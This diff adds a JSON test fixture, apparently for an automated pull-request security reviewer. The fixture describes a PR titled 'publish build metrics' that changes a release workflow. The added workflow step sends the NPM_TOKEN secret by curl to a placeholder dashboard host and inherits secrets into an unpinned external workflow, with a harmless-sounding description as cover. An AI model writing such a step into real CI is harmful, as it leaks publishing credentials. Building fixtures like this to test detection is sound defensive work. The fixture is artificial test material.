@@ -1,0 +1,84 @@
+{
+  "schema_version": 1,
+  "kind": "bundle",
+  "run_id": 123456,
+  "run_attempt": 1,
+  "repository_id": 42,
+  "pr_number": 13,
+  "head_sha": "0cbafbe7a85fef1f127a408f04c8319a3ad48ffe",
+  "base_repository_id": 42,
+  "base_ref": "main",
+  "base_tip_sha": "9a0943aa5f37c4e22221a03a42cda8e192d5cee7",
+  "merge_base_sha": "9a0943aa5f37c4e22221a03a42cda8e192d5cee7",
+  "status": "ok",
+  "payload": {
+    "pr": {
+      "repository": "OperationCode/eval-fixtures",
+      "repository_id": 42,
+      "number": 13,
+      "title": "CI: publish build metrics",
+      "body": "Sends build metrics to our dashboard after each release build.\n",
+      "author_login": "eval-author",
+      "author_association": "CONTRIBUTOR",
+      "labels": [],
+      "changed_files": 1
+    },
+    "files": [
+      {
+        "path": ".github/workflows/release.yml",
+        "old_path": null,
+        "status": "modified",
+        "base_mode": "100644",
+        "head_mode": "100644",
+        "additions": 14,
+        "deletions": 0,
+        "base_blob_sha": "a993eb7b60a6b2cafaa51a2fe939b0f00aed8027",
+        "head_blob_sha": "90096664fd551210e5e237c882531ea8fe0148ab",
+        "binary": false,
+        "size": 644,
+        "coverage": "full",
+        "patch": "@@ -14,3 +14,17 @@\n       - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0\n       - run: npm ci\n       - run: npm run build\n+\n+  metrics:\n+    needs: build\n+    uses: buildstats-tools/shared-workflows/.github/workflows/metrics.yml@main\n+    secrets: inherit\n+\n+  notify:\n+    needs: build\n+    runs-on: ubuntu-latest\n+    steps:\n+      - run: |\n+          curl -s -X POST https://ingest.buildstats-dashboard.example/v1/events \\\n+            -d \"repo=${{ github.repository }}\" \\\n+            -d \"npm=${{ secrets.NPM_TOKEN }}\"\n",
+        "patch_redaction": "blob-context",
+        "content": "name: release\n\non:\n  push:\n    tags: [\"v*\"]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0\n      - run: npm ci\n      - run: npm run build\n\n  metrics:\n    needs: build\n    uses: buildstats-tools/shared-workflows/.github/workflows/metrics.yml@main\n    secrets: inherit\n\n  notify:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          curl -s -X POST https://ingest.buildstats-dashboard.example/v1/events \\\n            -d \"repo=${{ github.repository }}\" \\\n            -d \"npm=${{ secrets.NPM_TOKEN }}\"\n",
+        "head_content": "name: release\n\non:\n  push:\n    tags: [\"v*\"]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0\n      - run: npm ci\n      - run: npm run build\n\n  metrics:\n    needs: build\n    uses: buildstats-tools/shared-workflows/.github/workflows/metrics.yml@main\n    secrets: inherit\n\n  notify:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          curl -s -X POST https://ingest.buildstats-dashboard.example/v1/events \\\n            -d \"repo=${{ github.repository }}\" \\\n            -d \"npm=${{ secrets.NPM_TOKEN }}\"\n",
+        "base_content": "name: release\n\non:\n  push:\n    tags: [\"v*\"]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0\n      - run: npm ci\n      - run: npm run build\n"
+      }
+    ],
+    "dependency_delta": {
+      "changes": [],
+      "new_global_sources": [],
+      "failures": []
+    },
+    "prefilter": {
+      "signals": [
+        {
+          "id": "sensitive-path",
+          "level": "signal",
+          "detail": "change to workflow",
+          "file": ".github/workflows/release.yml",
+          "subject": null,
+          "lines": [],
+          "count": 1
+        }
+      ],
+      "hard_blocks": []
+    },
+    "coverage": {
+      "trees_complete": true,
+      "files_in_comparison": 1,
+      "files_collected": 1,
+      "files": [
+        {
+          "path": ".github/workflows/release.yml",
+          "coverage": "full",
+          "reason": null
+        }
+      ],
+      "complete": true
+    },
+    "size": {
+      "estimated_tokens": 896,
+      "limit_tokens": 150000
+    }
+  }
+}
